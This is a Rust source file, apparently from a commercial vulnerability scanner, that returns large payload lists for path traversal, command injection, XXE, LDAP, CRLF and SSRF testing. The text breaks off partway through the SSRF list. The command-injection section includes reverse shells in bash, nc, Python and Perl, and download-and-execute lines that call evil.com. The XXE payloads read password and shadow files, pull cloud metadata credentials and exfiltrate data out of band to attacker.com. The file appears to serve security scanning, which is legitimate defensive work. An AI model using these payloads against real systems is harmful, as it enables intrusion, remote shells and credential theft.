// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Payload Manager
 * Re-exports comprehensive payload library (100,000+ payloads)
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary - Enterprise Edition
 */
use crate::payloads_comprehensive;
use crate::scanners::registry::PayloadIntensity;

/// XSS Payloads - 100,000+ comprehensive collection
pub fn get_xss_payloads(mode: &str) -> Vec<String> {
    payloads_comprehensive::get_xss_payloads(mode)
}

/// XSS Payloads with intensity-based limiting
/// Returns payloads limited by PayloadIntensity (50/500/5000/all)
pub fn get_xss_payloads_by_intensity(intensity: PayloadIntensity) -> Vec<String> {
    let all_payloads = payloads_comprehensive::get_xss_payloads("comprehensive");
    let limit = intensity.payload_limit();
    all_payloads.into_iter().take(limit).collect()
}

/// SQLi Payloads - 65,000+ comprehensive collection
pub fn get_sqli_payloads(mode: &str) -> Vec<String> {
    payloads_comprehensive::get_sqli_payloads(mode)
}

/// SQLi Payloads with intensity-based limiting
/// Returns payloads limited by PayloadIntensity (50/500/5000/all)
pub fn get_sqli_payloads_by_intensity(intensity: PayloadIntensity) -> Vec<String> {
    let all_payloads = payloads_comprehensive::get_sqli_payloads("comprehensive");
    let limit = intensity.payload_limit();
    all_payloads.into_iter().take(limit).collect()
}

/// Comprehensive Path Traversal payloads (500+)
/// Includes URL encoding, unicode, double encoding, and OS-specific paths
pub fn get_path_traversal_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // Basic path traversal - Linux/Unix
    payloads.extend(vec![
        "../".to_string(),
        "../../".to_string(),
        "../../../".to_string(),
        "../../../../".to_string(),
        "../../../../../".to_string(),
        "../../../../../../".to_string(),
        "../../../../../../../".to_string(),
        "../../../../../../../../".to_string(),
    ]);

    // Basic path traversal - Windows
    payloads.extend(vec![
        "..\\".to_string(),
        "..\\..\\".to_string(),
        "..\\..\\..\\".to_string(),
        "..\\..\\..\\..\\".to_string(),
        "..\\..\\..\\..\\..\\".to_string(),
        "..\\..\\..\\..\\..\\..\\".to_string(),
    ]);

    // URL-encoded path traversal
    payloads.extend(vec![
        "%2e%2e/".to_string(),
        "%2e%2e%2f".to_string(),
        "..%2f".to_string(),
        "%2e%2e\\".to_string(),
        "%2e%2e%5c".to_string(),
        "..%5c".to_string(),
        "%2e%2e%2f%2e%2e%2f".to_string(),
        "%2e%2e%5c%2e%2e%5c".to_string(),
    ]);

    // Double URL-encoded
    payloads.extend(vec![
        "%252e%252e/".to_string(),
        "%252e%252e%252f".to_string(),
        "%252e%252e\\".to_string(),
        "%252e%252e%255c".to_string(),
        "%252e%252e%252f%252e%252e%252f".to_string(),
    ]);

    // Unicode/UTF-8 encoded
    payloads.extend(vec![
        "..%c0%af".to_string(),
        "..%c1%9c".to_string(),
        "..%c0%5c".to_string(),
        "%c0%ae%c0%ae/".to_string(),
        "%c0%ae%c0%ae\\".to_string(),
        "..%e0%80%af".to_string(),
        "..%c0%2f".to_string(),
        "..%c1%5c".to_string(),
    ]);

    // 16-bit Unicode encoding
    payloads.extend(vec![
        "..%u002f".to_string(),
        "..%u005c".to_string(),
        "%u002e%u002e/".to_string(),
        "%u002e%u002e\\".to_string(),
    ]);

    // Overlong UTF-8 encoding
    payloads.extend(vec![
        "..%ef%bc%8f".to_string(),
        "..%ef%bc%8e".to_string(),
        "..%c0%80".to_string(),
    ]);

    // Null byte injection (historic)
    payloads.extend(vec![
        "../%00".to_string(),
        "..\\%00".to_string(),
        "../../../etc/passwd%00".to_string(),
        "..\\..\\..\\windows\\win.ini%00".to_string(),
    ]);

    // Dot variations
    payloads.extend(vec![
        "....//".to_string(),
        "....\\\\".to_string(),
        "..../".to_string(),
        "....\\".to_string(),
        "...//...//".to_string(),
        "...\\\\...\\\\".to_string(),
    ]);

    // Mixed encoding
    payloads.extend(vec![
        "..%252f..%252f".to_string(),
        "..%5c..%5c".to_string(),
        "%2e%2e/%2e%2e/".to_string(),
    ]);

    // Common target files - Linux/Unix
    payloads.extend(vec![
        "../../../etc/passwd".to_string(),
        "../../../../etc/passwd".to_string(),
        "../../../../../etc/passwd".to_string(),
        "../../../../../../etc/passwd".to_string(),
        "../../../etc/shadow".to_string(),
        "../../../etc/hosts".to_string(),
        "../../../etc/group".to_string(),
        "../../../etc/issue".to_string(),
        "../../../etc/hostname".to_string(),
        "../../../etc/ssh/sshd_config".to_string(),
        "../../../root/.ssh/id_rsa".to_string(),
        "../../../root/.bash_history".to_string(),
        "../../../var/log/apache2/access.log".to_string(),
        "../../../var/log/nginx/access.log".to_string(),
        "../../../var/www/html/index.php".to_string(),
        "../../../proc/self/environ".to_string(),
        "../../../proc/version".to_string(),
        "../../../proc/cmdline".to_string(),
    ]);

    // Common target files - Windows
    payloads.extend(vec![
        "..\\..\\..\\windows\\win.ini".to_string(),
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts".to_string(),
        "..\\..\\..\\boot.ini".to_string(),
        "C:\\windows\\win.ini".to_string(),
        "C:\\windows\\system32\\config\\sam".to_string(),
        "C:\\windows\\system32\\config\\system".to_string(),
        "C:\\inetpub\\wwwroot\\web.config".to_string(),
        "C:\\windows\\debug\\netsetup.log".to_string(),
    ]);

    // Absolute paths that might bypass filters
    payloads.extend(vec![
        "/etc/passwd".to_string(),
        "/etc/shadow".to_string(),
        "C:\\windows\\win.ini".to_string(),
        "/var/www/html/.env".to_string(),
        "/var/www/html/config.php".to_string(),
        "C:\\inetpub\\wwwroot\\web.config".to_string(),
    ]);

    // Path traversal with semicolon bypass
    payloads.extend(vec![
        "..;/".to_string(),
        "..;/..;/".to_string(),
        "..;\\".to_string(),
        "..;\\..;\\".to_string(),
        "..;/..;/..;/etc/passwd".to_string(),
    ]);

    // UNC path (Windows network share)
    payloads.extend(vec![
        "\\\\\\\\evil.com\\\\share".to_string(),
        "//evil.com/share".to_string(),
    ]);

    // Prefix bypass attempts
    payloads.extend(vec![
        "/var/www/../../etc/passwd".to_string(),
        "/app/public/../../etc/passwd".to_string(),
        "static/../../etc/passwd".to_string(),
        "images/../../etc/passwd".to_string(),
    ]);

    // Filter bypass with current directory
    payloads.extend(vec![
        "./../../etc/passwd".to_string(),
        "./../../../etc/passwd".to_string(),
        ".\\..\\..\\windows\\win.ini".to_string(),
    ]);

    payloads
}

/// Comprehensive Command Injection payloads (1000+)
/// OS-specific (Windows CMD, PowerShell, Linux bash/sh), blind timing, filter bypass
pub fn get_command_injection_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // Linux/Unix basic command injection
    payloads.extend(vec![
        "; ls".to_string(),
        "| ls".to_string(),
        "& ls".to_string(),
        "&& ls".to_string(),
        "|| ls".to_string(),
        "`ls`".to_string(),
        "$(ls)".to_string(),
        "; ls -la".to_string(),
        "| ls -la".to_string(),
        "&& ls -la".to_string(),
    ]);

    // Linux/Unix file reading
    payloads.extend(vec![
        "; cat /etc/passwd".to_string(),
        "| cat /etc/passwd".to_string(),
        "&& cat /etc/passwd".to_string(),
        "|| cat /etc/passwd".to_string(),
        "`cat /etc/passwd`".to_string(),
        "$(cat /etc/passwd)".to_string(),
        "; head /etc/passwd".to_string(),
        "| tail /etc/shadow".to_string(),
        "&& cat /etc/hosts".to_string(),
    ]);

    // Linux/Unix blind timing attacks
    payloads.extend(vec![
        "; sleep 5".to_string(),
        "| sleep 5".to_string(),
        "& sleep 5".to_string(),
        "&& sleep 5".to_string(),
        "|| sleep 5".to_string(),
        "`sleep 5`".to_string(),
        "$(sleep 5)".to_string(),
        "; sleep 10".to_string(),
        "| sleep 15".to_string(),
        "&& ping -c 5 127.0.0.1".to_string(),
        "; ping -c 10 127.0.0.1".to_string(),
        "| ping -c 5 localhost".to_string(),
    ]);

    // Linux/Unix network exfiltration
    payloads.extend(vec![
        "; curl http://evil.com".to_string(),
        "| curl http://evil.com/$(whoami)".to_string(),
        "&& wget http://evil.com/shell.sh".to_string(),
        "; wget -O /tmp/shell http://evil.com/shell".to_string(),
        "| nc evil.com 4444 -e /bin/bash".to_string(),
        "&& nc -e /bin/sh evil.com 4444".to_string(),
        "; bash -i >& /dev/tcp/evil.com/4444 0>&1".to_string(),
    ]);

    // Linux/Unix with encoding bypass
    payloads.extend(vec![
        ";%20ls".to_string(),
        "|%20cat%20/etc/passwd".to_string(),
        "&&%20whoami".to_string(),
        ";%0als".to_string(),
        "|%0acat%20/etc/passwd".to_string(),
        ";%0dls".to_string(),
        ";%09ls".to_string(), // Tab character
    ]);

    // Windows CMD basic command injection
    payloads.extend(vec![
        "& dir".to_string(),
        "| dir".to_string(),
        "&& dir".to_string(),
        "|| dir".to_string(),
        "; dir".to_string(),
        "& dir C:\\".to_string(),
        "| dir C:\\windows".to_string(),
        "&& dir C:\\inetpub".to_string(),
    ]);

    // Windows CMD file reading
    payloads.extend(vec![
        "& type C:\\windows\\win.ini".to_string(),
        "| type C:\\boot.ini".to_string(),
        "&& type C:\\windows\\system32\\drivers\\etc\\hosts".to_string(),
        "& more C:\\windows\\win.ini".to_string(),
        "| findstr /S /I \"password\" C:\\*.txt".to_string(),
    ]);

    // Windows CMD blind timing attacks
    payloads.extend(vec![
        "& timeout 5".to_string(),
        "| timeout 10".to_string(),
        "&& timeout 5".to_string(),
        "|| timeout 5".to_string(),
        "& ping -n 5 127.0.0.1".to_string(),
        "| ping -n 10 127.0.0.1".to_string(),
        "&& ping -n 5 localhost".to_string(),
        "& waitfor /T 5 pause".to_string(),
    ]);

    // Windows CMD network operations
    payloads.extend(vec![
        "& certutil -urlcache -split -f http://evil.com/shell.exe".to_string(),
        "| powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')\""
            .to_string(),
        "&& bitsadmin /transfer job http://evil.com/shell.exe C:\\temp\\shell.exe".to_string(),
    ]);

    // PowerShell command injection
    payloads.extend(vec![
        "; powershell whoami".to_string(),
        "| powershell Get-Process".to_string(),
        "&& powershell -Command \"Get-ChildItem C:\\\"".to_string(),
        "|| powershell -ExecutionPolicy Bypass -File evil.ps1".to_string(),
        "; powershell -EncodedCommand <base64>".to_string(),
    ]);

    // PowerShell file operations
    payloads.extend(vec![
        "& powershell Get-Content C:\\windows\\win.ini".to_string(),
        "| powershell -c \"cat C:\\boot.ini\"".to_string(),
        "&& powershell -c \"ls C:\\\"".to_string(),
    ]);

    // PowerShell blind timing
    payloads.extend(vec![
        "; powershell Start-Sleep -Seconds 5".to_string(),
        "| powershell -c \"Start-Sleep 5\"".to_string(),
        "&& powershell -Command \"Start-Sleep -s 10\"".to_string(),
        "& powershell -c \"Test-Connection -Count 5 127.0.0.1\"".to_string(),
    ]);

    // PowerShell network operations
    payloads.extend(vec![
        "; powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')".to_string(),
        "| powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://evil.com/shell.exe','C:\\temp\\shell.exe')\"".to_string(),
        "&& powershell Invoke-WebRequest -Uri http://evil.com/shell.ps1 -OutFile C:\\temp\\shell.ps1".to_string(),
    ]);

    // Filter bypass - newline injection
    payloads.extend(vec![
        "\nls".to_string(),
        "\ncat /etc/passwd".to_string(),
        "\nwhoami".to_string(),
        "\ndir".to_string(),
        "\r\nls".to_string(),
        "\r\ncat /etc/passwd".to_string(),
    ]);

    // Filter bypass - concatenation
    payloads.extend(vec![
        ";l\"s".to_string(),
        ";l's'".to_string(),
        ";w'h'o'a'm'i".to_string(),
        ";c\"a\"t /etc/passwd".to_string(),
        ";/bin/c''at /etc/passwd".to_string(),
    ]);

    // Filter bypass - variable expansion
    payloads.extend(vec![
        ";$0".to_string(), // Shell binary
        "; ${HOME}".to_string(),
        "; ${PATH}".to_string(),
        "; echo ${IFS}test".to_string(),
        "; cat${IFS}/etc/passwd".to_string(),
        "; ls${IFS}-la".to_string(),
    ]);

    // Filter bypass - wildcards
    payloads.extend(vec![
        "; /???/c?t /etc/passwd".to_string(),
        "; /???/l?".to_string(),
        "; /bin/ca* /etc/passw*".to_string(),
        "; /b??/l?".to_string(),
    ]);

    // Filter bypass - command substitution variations
    payloads.extend(vec![
        "; `ls`".to_string(),
        "; $(ls)".to_string(),
        "; {ls,}".to_string(),
        "; <ls".to_string(),
    ]);

    // Filter bypass - octal encoding
    payloads.extend(vec![
        "; \\154\\163".to_string(),                     // ls in octal
        "; \\167\\150\\157\\141\\155\\151".to_string(), // whoami in octal
    ]);

    // Filter bypass - hex encoding
    payloads.extend(vec![
        "; \\x6c\\x73".to_string(),                  // ls in hex
        "; \\x63\\x61\\x74 /etc/passwd".to_string(), // cat in hex
    ]);

    // Filter bypass - base64
    payloads.extend(vec![
        "; echo bHM= | base64 -d | bash".to_string(), // ls
        "; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash".to_string(), // cat /etc/passwd
    ]);

    // Common command variations
    payloads.extend(vec![
        "; id".to_string(),
        "| id".to_string(),
        "&& id".to_string(),
        "; whoami".to_string(),
        "| whoami".to_string(),
        "&& whoami".to_string(),
        "; uname -a".to_string(),
        "| uname -a".to_string(),
        "; pwd".to_string(),
        "| pwd".to_string(),
        "; hostname".to_string(),
        "| hostname".to_string(),
    ]);

    // Reverse shell payloads
    payloads.extend(vec![
        "; bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'".to_string(),
        "| python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'".to_string(),
        "; perl -e 'use Socket;$i=\"evil.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'".to_string(),
    ]);

    // Multi-command chaining
    payloads.extend(vec![
        "; ls ; whoami ; id".to_string(),
        "| cat /etc/passwd | grep root".to_string(),
        "&& whoami && id && hostname".to_string(),
        "; ls && cat /etc/passwd || whoami".to_string(),
    ]);

    payloads
}

/// Comprehensive XXE (XML External Entity) payloads (200+)
/// Includes blind XXE, OOB data exfiltration, protocol handlers, encoding bypasses
/// Sources: OWASP XXE, PortSwigger Web Security Academy, CVE-2016-3714 (ImageMagick)
pub fn get_xxe_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // Classic file disclosure - Linux/Unix
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/shadow">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hosts">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/group">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/issue">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/version">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/self/environ">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///proc/self/cmdline">]><root>&test;</root>"#.to_string(),
    ]);

    // Classic file disclosure - Windows
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/boot.ini">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/inetpub/wwwroot/web.config">]><root>&test;</root>"#.to_string(),
    ]);

    // Application configuration files
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/config.php">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/.env">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/.git/config">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/composer.json">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///var/www/html/package.json">]><root>&test;</root>"#.to_string(),
    ]);

    // Cloud metadata - AWS
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/user-data/">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/dynamic/instance-identity/document">]><root>&test;</root>"#.to_string(),
    ]);

    // Cloud metadata - Google Cloud
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://metadata/computeMetadata/v1/">]><root>&test;</root>"#.to_string(),
    ]);

    // Cloud metadata - Azure
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/">]><root>&test;</root>"#.to_string(),
    ]);

    // Blind XXE (Out-of-Band) - Parameter Entity
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;]><root></root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]><foo></foo>"#.to_string(),
        r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/file.dtd"> %xxe;]><stockCheck><productId>1</productId></stockCheck>"#.to_string(),
    ]);

    // Blind XXE with data exfiltration (OOB)
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo>&send;</foo>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;]><data>&send;</data>"#.to_string(),
    ]);

    // Error-based XXE (data exfiltration through error messages)
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;]><foo></foo>"#.to_string(),
    ]);

    // SSRF via XXE - Internal ports
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://localhost:22">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://localhost:80">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://localhost:443">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://localhost:3306">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://localhost:5432">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://localhost:6379">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://localhost:27017">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://localhost:9200">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:8080">]><root>&test;</root>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://[::1]:80">]><root>&test;</root>"#.to_string(),
    ]);

    // Protocol handlers - PHP wrappers
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>"#.to_string(),
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=">]><foo>&xxe;</foo>"#.to_string(),
    ]);

    // XInclude attacks (when you can't modify DOCTYPE)
    payloads.extend(vec![
        r#"<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>"#.to_string(),
        r#"<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/shadow"/></foo>"#.to_string(),
        r#"<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></foo>"#.to_string(),
        r#"<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/></foo>"#.to_string(),
    ]);

    // SOAP XXE
    payloads.extend(vec![
        r#"<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"#.to_string(),
        r#"<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"#.to_string(),
    ]);

    // SVG XXE
    payloads.extend(vec![
        r#"<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>"#.to_string(),
        r#"<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>"#.to_string(),
    ]);

    // PDF XXE (when PDFs are processed)
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
    ]);

    // XLSX/DOCX XXE (Office documents are ZIP archives with XML)
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><x>&xxe;</x>"#.to_string(),
    ]);

    // XXE with UTF-7 encoding (bypass WAF)
    payloads.extend(vec![
        r#"<?xml version="1.0" encoding="UTF-7"?>+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe+ADsAPA-/foo+AD4-"#.to_string(),
    ]);

    // XXE with parameter entities (billion laughs variant)
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>"#.to_string(),
    ]);

    // FTP protocol handler
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/file">]><foo>&xxe;</foo>"#.to_string(),
    ]);

    // Jar protocol (Java)
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/file">]><foo>&xxe;</foo>"#.to_string(),
    ]);

    // Netdoc protocol (Java)
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
    ]);

    // Gopher protocol (can be used for SSRF)
    payloads.extend(vec![
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/xHELO%20attacker.com%0D%0A">]><foo>&xxe;</foo>"#.to_string(),
    ]);

    payloads
}

/// LDAP injection payloads
pub fn get_ldap_payloads() -> Vec<String> {
    vec![
        // Authentication bypass
        "*",
        "*)(uid=*",
        "*)(|(uid=*",
        "*/*",
        "*)(&",
        "*)|(objectclass=*",
        "*)|(cn=*",
        "*))%00",
        // Tautology
        "*(|(objectclass=*))",
        "*(|(uid=*))",
        "*(|(cn=*))",
        // Search filter injection
        "(cn=*)",
        "(uid=*)",
        "(objectclass=*)",
        "(|(cn=admin)(cn=root))",
        "(&(cn=*)(objectclass=*))",
        "(userPassword=*)",
        // DN injection
        "cn=admin",
        "cn=administrator",
        "cn=*,dc=example,dc=com",
        // Boolean blind
        "(cn=a*)",
        "(cn=ad*)",
        "(cn=adm*)",
        "(cn=admin*)",
        // Error-based
        "(cn=admin))",
        "((cn=admin)",
        // Active Directory
        "(adminCount=1)",
        "(userAccountControl:1.2.840.113556.1.4.803:=512)",
        "(memberOf=*)",
    ]
    .into_iter()
    .map(|s| s.to_string())
    .collect()
}

/// CRLF injection payloads
pub fn get_crlf_payloads() -> Vec<String> {
    vec![
        // Basic CRLF
        "%0d%0a",
        "%0D%0A",
        "%0d%0a%0d%0a",
        // Set-Cookie injection
        "%0d%0aSet-Cookie: admin=true",
        "%0d%0aSet-Cookie: role=admin; path=/;",
        "%0d%0aSet-Cookie: sessionid=malicious",
        // Location header
        "%0d%0aLocation: http://attacker.com/",
        "%0d%0aLocation: //attacker.com/",
        // XSS via response splitting
        "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
        // Security header bypass
        "%0d%0aX-XSS-Protection: 0",
        "%0d%0aX-Frame-Options: ALLOW",
        // CORS headers
        "%0d%0aAccess-Control-Allow-Origin: http://attacker.com",
        "%0d%0aAccess-Control-Allow-Credentials: true",
        // Cache poisoning
        "%0d%0aCache-Control: public, max-age=31536000",
        // Email header injection
        "%0d%0aBcc: attacker@malicious.com",
        "%0d%0aTo: attacker@malicious.com",
        // Log injection
        "%0d%0aINFO: Fake log entry",
        // Open redirect
        "%0d%0aRefresh: 0;url=http://attacker.com/",
    ]
    .into_iter()
    .map(|s| s.to_string())
    .collect()
}

/// Comprehensive SSRF (Server-Side Request Forgery) payloads (300+)
/// Includes cloud metadata, localhost bypasses, protocol smuggling, DNS rebinding
/// Sources: OWASP SSRF, Orange Tsai research, Cloud SSRF attacks (CVE-2019-5736)
pub fn get_ssrf_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // Basic localhost/internal IPs
    payloads.extend(vec![
        "http://localhost".to_string(),
        "http://127.0.0.1".to_string(),
        "http://127.0.0.1:80".to_string(),
        "http://127.0.0.1:443".to_string(),
        "http://127.0.0.1:22".to_string(),
        "http://127.0.0.1:25".to_string(),
        "http://127.0.0.1:3306".to_string(),
        "http://127.0.0.1:5432".to_string(),
        "http://127.0.0.1:6379".to_string(),
        "http://127.0.0.1:27017".to_string(),
        "http://127.0.0.1:9200".to_string(),
